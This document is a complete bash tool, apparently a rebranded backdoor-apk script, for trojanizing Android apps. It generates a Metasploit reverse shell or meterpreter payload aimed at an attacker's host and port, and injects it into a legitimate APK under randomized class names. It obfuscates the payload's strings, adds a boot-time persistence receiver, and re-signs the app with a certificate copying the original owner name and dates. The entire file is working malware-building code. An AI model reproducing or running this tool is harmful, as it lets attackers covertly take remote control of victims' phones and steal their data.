#!/bin/bash

# file: ApkHack-BackDoor.sh

# usage: ./ApkHack-BackDoor.sh original.apk

# Alpha-HackGod 
# Offensive and Defensive Security Specialist | Hacker-in-Residence
# Reverse Engineer | Penetration Tester

# IMPORTANT: The following packages were required on Kali Linux
#   in order to get things rolling. These packages are likely
#   required by other Linux distros as well.
# apt-get install lib32z1 lib32ncurses5 lib32stdc++6

VERSION="2.0.4a"

PAYLOAD=""
LHOST=""
LPORT=""
PERM_OPT=""

ORIG_PACKAGE=""
INJECT_PACKAGE=""
SMALI_FILE_TO_HOOK=""

MSFVENOM=msfvenom
BAKSMALI=baksmali
UNZIP=unzip
KEYTOOL=keytool
JARSIGNER=jarsigner
APKTOOL=apktool
ASO=third-party/android-string-obfuscator/lib/aso
DX=third-party/android-sdk-linux/build-tools/25.0.2/dx
ZIPALIGN=third-party/android-sdk-linux/build-tools/25.0.2/zipalign
# file paths and misc
MY_PATH=`pwd`
TMP_DIR=$MY_PATH/tmp
ORIG_APK_FILE=$1
ORIG_APK_FILE_NAME=""
RAT_APK_FILE=Rat.apk
LOG_FILE=$MY_PATH/run.log
TIME_OF_RUN=`date`
# for functions
FUNC_RESULT=""

# functions
function gen_placeholder {
  local result=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 32 | head -n 1)
  FUNC_RESULT=$result
  return 0
}

function gen_smali_package_dir {
  local dir=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 5 | head -n 1)
  FUNC_RESULT=$dir
  return 0
}

function gen_smali_class_name {
  local start=$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 1 | head -n 1)
  local end=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 4 | head -n 1)
  FUNC_RESULT=$start$end
  return 0
}

function find_smali_file {
  # $1 = smali_file_to_hook
  # $2 = android_class
  if [ ! -f $1 ]; then
    local index=2
    local max=1000
    local smali_file=""
    while [ $index -lt $max ]; do
      smali_file=$MY_PATH/original/smali_classes$index/$2.smali
      if [ -f $smali_file ]; then
        # found
        FUNC_RESULT=$smali_file
        return 0
      else
        let index=index+1
      fi
    done
    # not found
    return 1
  else
    FUNC_RESULT=$1
    return 0
  fi
}

function hook_smali_file {
  # $1 = new_ms_name
  # $2 = smali_file_to_hook
  local smali_file=$2
  inject_line_num=$(grep -n "return-void" $smali_file |head -n 1|awk -F ":" '{ print $1 }')
  sed -i ''"$inject_line_num"'i\ \ \ \ invoke-static \{\}, L'"$INJECT_PACKAGE"'\/'"$1"';->start()V\n' $smali_file >>$LOG_FILE 2>&1
  grep -B 2 "$INJECT_PACKAGE/$1" $smali_file >>$LOG_FILE 2>&1
  if [ $? == 0 ]; then
    echo "The smali file was hooked successfully" >>$LOG_FILE 2>&1
    FUNC_RESULT=$smali_file
    return 0
  else
    echo "Failed to hook smali file" >>$LOG_FILE 2>&1
    return 1
  fi
}

function cleanup {
  echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
  bash cleanup.sh >>$LOG_FILE 2>&1
}

function verify_orig_apk {
  if [ -z $ORIG_APK_FILE ]; then
    echo "[!] No original APK file specified"
    exit 1
  fi

  if [ ! -f $ORIG_APK_FILE ]; then
    echo "[!] Original APK file specified does not exist"
    exit 1
  fi

  $UNZIP -l $ORIG_APK_FILE >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo "[!] Original APK file specified is not valid"
    exit $rc
  fi
}

function consult_which {
  which $1 >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    echo "[!] Check your environment and configuration. Couldn't find: $1"
    exit $rc
  fi
}

function print_ascii_art {
cat << "EOF"

   mm   mm   m mmmm   mmmmm   mmmm  mmmmm  mmmm   m    m   mm     mmm  m    m
   ##   #"m  # #   "m #   "# m"  "m   #    #   "m #    #   ##   m"   " #  m" 
  #  #  # #m # #    # #mmmm" #    #   #    #    # #mmmm#  #  #  #      #m#   
  #mm#  #  # # #    # #   "m #    #   #    #    # #    #  #mm#  #      #  #m 
 #    # #   ## #mmm"  #    "  #mm#  mm#mm  #mmm"  #    # #    #  "mmm" #   "m

                                                           BITGOD

EOF
}

function get_payload {
  echo "[+] Android Hack payload options:"
  PS3='[?] Please select an Android payload option: '
  options=("exploit meterpreter/reverse_http" "exploit meterpreter/reverse_https" "exploit meterpreter/reverse_tcp" "exploit shell/reverse_http" "exploit shell/reverse_https" "exploit shell/reverse_tcp")
  select opt in "${options[@]}"
  do
    case $opt in
      "exploit meterpreter/reverse_http")
        PAYLOAD="android/meterpreter/reverse_http"
        break
        ;;
      "exploit meterpreter/reverse_https")
        PAYLOAD="android/meterpreter/reverse_https"
        break
        ;;
      "exploit meterpreter/reverse_tcp")
        PAYLOAD="android/meterpreter/reverse_tcp"
        break
        ;;
      "exploit shell/reverse_http")
        PAYLOAD="android/shell/reverse_http"
        break
        ;;
      "exploit shell/reverse_https")
        PAYLOAD="android/shell/reverse_https"
        break
        ;;
      "exploit shell/reverse_tcp")
        PAYLOAD="android/shell/reverse_tcp"
        break
        ;;
      *)
        echo "[!] Invalid option selected"
        ;;
    esac
  done
}

function get_lhost {
  while true; do
    read -p "[?] Please enter an LHOST value: " lh
    if [ $lh ]; then
      LHOST=$lh
      break
    fi
  done
}

function get_lport {
  while true; do
    read -p "[?] Please enter an LPORT value: " lp
    if [ $lp ]; then
      if [[ "$lp" =~ ^[0-9]+$ ]] && [ "$lp" -ge 1 -a "$lp" -le 65535 ]; then
        LPORT=$lp
        break
      fi
    fi
  done
}

function get_perm_opt {
  echo "[+] Android manifest permission options:"
  PS3='[?] Please select an Android manifest permission option: '
  options=("Keep original" "Merge with payload and shuffle")
  select opt in "${options[@]}"
  do
    case $opt in
      "Keep original")
        PERM_OPT="KEEPO"
        break
        ;;
      "Merge with payload and shuffle")
        PERM_OPT="RANDO"
        break
        ;;
      *)
        echo "[!] Invalid option selected"
        ;;
    esac
  done
}

function init {
  echo "Executing backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
  print_ascii_art
  echo "[*] Executing backdoor-apk.sh v$VERSION on $TIME_OF_RUN"
  consult_which $MSFVENOM
  consult_which $BAKSMALI
  consult_which $UNZIP
  consult_which $KEYTOOL
  consult_which $JARSIGNER
  consult_which $APKTOOL
  consult_which $ASO
  consult_which $DX
  consult_which $ZIPALIGN
  verify_orig_apk
  get_payload
  get_lhost
  get_lport
  get_perm_opt
  mkdir -v $TMP_DIR >>$LOG_FILE 2>&1
}

# kick things off
init

# generate Metasploit resource script
cat >$MY_PATH/backdoor-apk.rc <<EOL
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j -z
EOL
echo "[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc"

ORIG_APK_FILE_NAME=`echo "${ORIG_APK_FILE##*/}"`
echo "Wroking on original APK: $ORIG_APK_FILE_NAME" >>$LOG_FILE 2>&1
echo -n "[*] Decompiling original APK file..."
$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile original APK file"
  cleanup
  exit $rc
fi

echo -n "[*] Locating smali file to hook in original project..."
total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
android_name=`grep "<application" $MY_PATH/original/AndroidManifest.xml|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
echo "Value of android_name: $android_name" >>$LOG_FILE 2>&1
android_class=$android_name
echo "Value of android_class: $android_class" >>$LOG_FILE 2>&1
smali_file_to_hook=$MY_PATH/original/smali/$android_class.smali
find_smali_file $smali_file_to_hook $android_class
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to locate smali file to hook"
  cleanup
  exit $rc
else
  echo "done."
  smali_file_to_hook=$FUNC_RESULT
  echo "The smali file to hook: $smali_file_to_hook" >>$LOG_FILE 2>&1
  ORIG_PACKAGE=$total_package
  SMALI_FILE_TO_HOOK=$smali_file_to_hook
fi
echo "[+] Package where RAT smali files will be injected: $ORIG_PACKAGE"
echo "[+] Smali file to hook RAT payload: $android_class.smali"

echo -n "[*] Generating RAT APK file..."
$MSFVENOM -a dalvik --platform android -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
  echo "[!] Failed to generate RAT APK file"
  exit 1
fi

echo -n "[*] Decompiling RAT APK file..."
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile RAT APK file"
  cleanup
  exit $rc
fi

gen_placeholder
placeholder=$FUNC_RESULT
echo "placeholder value: $placeholder" >>$LOG_FILE 2>&1

original_manifest_file=$MY_PATH/original/AndroidManifest.xml
if [ "$PERM_OPT" == "RANDO" ]; then
  echo -n "[*] Merging permissions of original and payload projects..."
  tmp_perms_file=$MY_PATH/perms.tmp
  payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
  merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
  grep "<uses-permission" $original_manifest_file >$tmp_perms_file
  grep "<uses-permission" $payload_manifest_file >>$tmp_perms_file
  grep "<uses-permission" $tmp_perms_file|sort|uniq|shuf >$tmp_perms_file.uniq
  mv $tmp_perms_file.uniq $tmp_perms_file
  sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file >$merged_manifest_file
  awk '/^[ \t]*'"$placeholder"'/&&c++ {next} 1' $merged_manifest_file >$merged_manifest_file.uniq
  mv $merged_manifest_file.uniq $merged_manifest_file
  sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
  diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
  mv $merged_manifest_file $original_manifest_file
  echo "done."
  # cleanup payload directory after merging app permissions
  #rm -rf $MY_PATH/payload >>$LOG_FILE 2>&1
elif [ "$PERM_OPT" == "KEEPO" ]; then
  echo "[+] Keeping permissions of original project"
else
  echo "[!] Something went terribly wrong..."
  cleanup
  exit 1
fi

# use dx and baksmali to inject Java classes
echo -n "[*] Injecting helpful Java classes in RAT APK file..."
mkdir -v -p $MY_PATH/bin/classes >>$LOG_FILE 2>&1
mkdir -v -p $MY_PATH/libs >>$LOG_FILE 2>&1
$DX --dex --output="$MY_PATH/bin/classes/classes.dex" $MY_PATH/java/* >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to run dx on Java class files"
  cleanup
  exit $rc
fi
$BAKSMALI d -o $MY_PATH/bin/classes/smali $MY_PATH/bin/classes/classes.dex >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to run baksmali on classes.dex created for Java class files"
  cleanup
  exit $rc
fi
cp -v -r $MY_PATH/bin/classes/smali/* $MY_PATH/payload/smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "done."
  echo "[!] Failed to inject smali files dervied from Java classes"
  cleanup
  exit $rc
fi
echo "done."

# avoid having com/metasploit/stage path to smali files
echo -n "[*] Creating new directory in original package for RAT smali files..."
gen_smali_package_dir
inject_package_dir=$FUNC_RESULT
inject_package_path=$ORIG_PACKAGE/$inject_package_dir
mkdir -v -p $MY_PATH/original/smali/$inject_package_path >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to create new directory for RAT smali files"
  cleanup
  exit $rc
else
  echo "[+] Inject package path: $inject_package_path"
  INJECT_PACKAGE=$inject_package_path
fi

# create new smali class names
gen_smali_class_name
new_mbr_name=$FUNC_RESULT
echo "[+] Generated new smali class name for MainBroadcastReceiver.smali: $new_mbr_name"
gen_smali_class_name
new_ms_name=$FUNC_RESULT
echo "[+] Generated new smali class name for MainService.smali: $new_ms_name"
gen_smali_class_name
new_payload_name=$FUNC_RESULT
echo "[+] Generated new smali class name for Payload.smali: $new_payload_name"
gen_smali_class_name
new_so_name=$FUNC_RESULT
echo "[+] Generated new smali class name for StringObfuscator.smali: $new_so_name"
gen_smali_package_dir
new_so_obfuscate_method_name=$FUNC_RESULT
echo "[+] Generated new smali method name for StringObfuscator.obfuscate method: $new_so_obfuscate_method_name"
gen_smali_package_dir
new_so_unobfuscate_method_name=$FUNC_RESULT
echo "[+] Generated new smali method name for StringObfuscator.unobfuscate method: $new_so_unobfuscate_method_name"

echo -n "[*] Copying RAT smali files to new directories in original project..."
# handle MainBroadcastReceiver.smali
mv -v $MY_PATH/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_mbr_name.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  # handle MainService.smali
  mv -v $MY_PATH/payload/smali/com/metasploit/stage/MainService.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_ms_name.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  # handle Payload.smali
  mv -v $MY_PATH/payload/smali/com/metasploit/stage/Payload.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_payload_name.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  cp -v $MY_PATH/payload/smali/com/metasploit/stage/*.smali $MY_PATH/original/smali/$INJECT_PACKAGE >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  rm -v $MY_PATH/original/smali/$INJECT_PACKAGE/MainActivity.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  cp -v $MY_PATH/payload/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to copy RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Fixing RAT smali files..."
sed -i "s/MainBroadcastReceiver/$new_mbr_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  sed -i "s/MainService/$new_ms_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i "s/Payload/$new_payload_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i "s/StringObfuscator/$new_so_name/g" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i 's|com\([./]\)metasploit\([./]\)stage|'"$INJECT_PACKAGE"'|g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  sed -i 's|net\([./]\)dirtybox\([./]\)util\([./]\)obfuscation|'"$INJECT_PACKAGE"'|g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
  rc=$?
fi
if [ $rc == 0 ]; then
  #.method public static obfuscate(Ljava/lang/String;)Ljava/lang/String;
  #.method public static unobfuscate(Ljava/lang/String;)Ljava/lang/String;
  sed -i 's:method public static obfuscate:method public static '"$new_so_obfuscate_method_name"':g' $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    sed -i 's:method public static unobfuscate:method public static '"$new_so_unobfuscate_method_name"':g' $MY_PATH/original/smali/$INJECT_PACKAGE/$new_so_name.smali >>$LOG_FILE 2>&1
    rc=$?
  fi
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to fix RAT smali files"
  cleanup
  exit $rc
fi

# TODO: Refactor and improve error handling and logging
echo -n "[*] Obfuscating const-string values in RAT smali files..."
cat >$MY_PATH/obfuscate.method <<EOL
    const-string ###REG###, "###VALUE###"

    invoke-static {###REG###}, L###CLASS###;->###METHOD###(Ljava/lang/String;)Ljava/lang/String;

    move-result-object ###REG###
EOL
stringobfuscator_class=$INJECT_PACKAGE/$new_so_name
echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
so_class_suffix="$new_so_name.smali"
echo "StringObfuscator class suffix: $so_class_suffix" >>$LOG_FILE 2>&1
so_default_key="7IPR19mk6hmUY+hdYUaCIw=="
so_key=$so_default_key
which openssl >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  so_key="$(openssl rand -base64 16)"
  rc=$?
fi
if [ $rc == 0 ]; then
  file="$MY_PATH/original/smali/$stringobfuscator_class.smali"
  sed -i 's%'"$so_default_key"'%'"$so_key"'%' $file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    echo "Injected new key into StringObufscator class" >>$LOG_FILE 2>&1
  else
    echo "Failed to inject new key into StringObfuscator class, using default key" >>$LOG_FILE 2>&1
    so_key=$so_default_key
  fi
else
  echo "Failed to generate a new StringObfuscator key, using default key" >>$LOG_FILE 2>&1
  so_key=$so_default_key 
fi
echo "StringObfuscator key: $so_key" >>$LOG_FILE 2>&1
sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  grep "const-string" -n --exclude="$so_class_suffix" $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali |while read -r line; do
    gen_placeholder
    placeholder=$FUNC_RESULT
    echo "Placeholder: $placeholder" >>$LOG_FILE 2>&1
    filewithlinenum=`echo $line |awk -F ": " '{ print $1 }'`
    echo "File with line num: $filewithlinenum" >>$LOG_FILE 2>&1
    file=`echo $filewithlinenum |awk -F ":" '{ print $1 }'`
    echo "File: $file" >>$LOG_FILE 2>&1
    linenum=`echo $filewithlinenum |awk -F ":" '{ print $2 }'`
    echo "Line num: $linenum" >>$LOG_FILE 2>&1
    target=`echo $line |awk -F ", " '{ print $2 }'`
    echo "Target: $target" >>$LOG_FILE 2>&1
    tmp=`echo $line |awk -F ": " '{ print $2 }'`
    reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
    echo "Reg: $reg" >>$LOG_FILE 2>&1
    stripped_target=`sed -e 's/^"//' -e 's/"$//' <<<"$target"`
    echo "Stripped target: $stripped_target" >>$LOG_FILE 2>&1
    replacement=`$ASO e "$stripped_target" k "$so_key"`
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to obfuscate target value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
    echo "Replacement: $replacement" >>$LOG_FILE 2>&1
    echo "" >> $LOG_FILE 2>&1

    sed -i -e ''"$linenum"'d' $file >>$LOG_FILE 2>&1
    sed -i ''"$linenum"'i '"$placeholder"'' $file >>$LOG_FILE 2>&1

    cp -v $MY_PATH/obfuscate.method $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1

    echo "$placeholder" >> $TMP_DIR/placeholders.txt

    sed -i 's/###REG###/'"$reg"'/' $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject register value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
    sed -i 's|###VALUE###|'"$replacement"'|' $TMP_DIR/$placeholder.stub >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc != 0 ]; then
      echo "Failed to inject replacement value" >>$LOG_FILE 2>&1
      touch $MY_PATH/obfuscate.error
      break
    fi
  done
  cd $TMP_DIR
  cat placeholders.txt |while read placeholder; do
    if [ -f $placeholder.stub ]; then
      sed -i -e '/'"$placeholder"'/r '"$placeholder"'.stub' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
      sed -i -e '/'"$placeholder"'/d' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali >>$LOG_FILE 2>&1
    fi
  done
  cd $MY_PATH
  rm -v $TMP_DIR/*.stub >>$LOG_FILE 2>&1
  rm -v $TMP_DIR/placeholders.txt >>$LOG_FILE 2>&1
  if [ ! -f $MY_PATH/obfuscate.error ]; then
    class="$stringobfuscator_class"
    sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali
    rc=$?
    if [ $rc == 0 ]; then
      method="$new_so_unobfuscate_method_name"
      sed -i 's|###METHOD###|'"$method"'|' $MY_PATH/original/smali/$INJECT_PACKAGE/*.smali
      rc=$?
    fi
  else
    rm -v $MY_PATH/obfuscate.error >>$LOG_FILE 2>&1
    rc=1
  fi
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to obfuscate const-string values in RAT smali files"
  cleanup
  exit $rc
fi

echo -n "[*] Adding hook in original smali file..."
hook_smali_file $new_ms_name $smali_file_to_hook
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to add hook"
  cleanup
  exit $rc
fi

dotted_inject_package=$(echo "$INJECT_PACKAGE" |sed -r 's:/:.:g')
cat >$MY_PATH/persistence.hook <<EOL
        <receiver android:name="${dotted_inject_package}.${new_mbr_name}">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name="${dotted_inject_package}.${new_ms_name}"/>
EOL
grep "android.permission.RECEIVE_BOOT_COMPLETED" $original_manifest_file >>$LOG_FILE 2>&1
rc=$?
if [ $rc == 0 ]; then
  echo -n "[*] Adding persistence hook in original project..."
  sed -i '0,/<\/application>/s//'"$placeholder"'\n    <\/application>/' $original_manifest_file >>$LOG_FILE 2>&1
  rc=$?
  if [ $rc == 0 ]; then
    sed -i '/'"$placeholder"'/r '"$MY_PATH"'/persistence.hook' $original_manifest_file >>$LOG_FILE 2>&1
    rc=$?
    if [ $rc == 0 ]; then
      sed -i '/'"$placeholder"'/d' $original_manifest_file >>$LOG_FILE 2>&1
      rc=$?
    fi
  fi
  echo "done."
  if [ $rc != 0 ]; then
    echo "[!] Failed to add persistence hook"
    cleanup
    exit $rc
  fi
else
  echo "[+] Unable to add persistence hook due to missing permission"
fi

echo -n "[*] Recompiling original project with backdoor..."
$APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to recompile original project with backdoor"
  cleanup
  exit $rc
fi

keystore=$MY_PATH/signing.keystore
compiled_apk=$MY_PATH/original/dist/$ORIG_APK_FILE_NAME
unaligned_apk=$MY_PATH/original/dist/unaligned.apk

dname=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Owner:" |sed 's/^.*: //g'`
echo "Original dname value: $dname" >>$LOG_FILE 2>&1

valid_from_line=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FILE |grep -m 1 "Valid from:"`
echo "Original valid from line: $valid_from_line" >>$LOG_FILE 2>&1
from_date=$(sed 's/^Valid from://g' <<< $valid_from_line |sed 's/until:.\+$//g' |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original from date: $from_date" >>$LOG_FILE 2>&1
from_date_tz=$(awk '{ print $5 }' <<< $from_date)
from_date_norm=$(sed 's/[[:space:]]'"$from_date_tz"'//g' <<< $from_date)
echo "Normalized from date: $from_date_norm" >>$LOG_FILE 2>&1
to_date=$(sed 's/^Valid from:.\+until://g' <<< $valid_from_line |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
echo "Original to date: $to_date" >>$LOG_FILE 2>&1
to_date_tz=$(awk '{ print $5 }' <<< $to_date)
to_date_norm=$(sed 's/[[:space:]]'"$to_date_tz"'//g' <<< $to_date)
echo "Normalized to date: $to_date_norm" >>$LOG_FILE 2>&1
from_date_str=`TZ=UTC date --date="$from_date_norm" +"%Y/%m/%d %T"`
echo "Value of from_date_str: $from_date_str" >>$LOG_FILE 2>&1
end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
echo "Value of validity: $validity" >>$LOG_FILE 2>&1

echo -n "[*] Generating RSA key for signing..."
$KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
rc=$?
if [ $rc != 0 ]; then
  echo "Retrying RSA key generation without original APK cert from date and validity values" >>$LOG_FILE 2>&1
  $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
  rc=$?
fi
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to generate RSA key"
  cleanup
  exit $rc
fi

echo -n "[*] Signing recompiled APK..."
$JARSIGNER -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apk signing.key >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to sign recompiled APK"
  cleanup
  exit $rc
fi

echo -n "[*] Verifying signed artifacts..."
$JARSIGNER -verify -certs $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to verify signed artifacts"
  cleanup
  exit $rc
fi

mv $compiled_apk $unaligned_apk

echo -n "[*] Aligning recompiled APK..."
$ZIPALIGN 4 $unaligned_apk $compiled_apk >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to align recompiled APK"
  cleanup
  exit $rc
fi

rm $unaligned_apk

exit 0
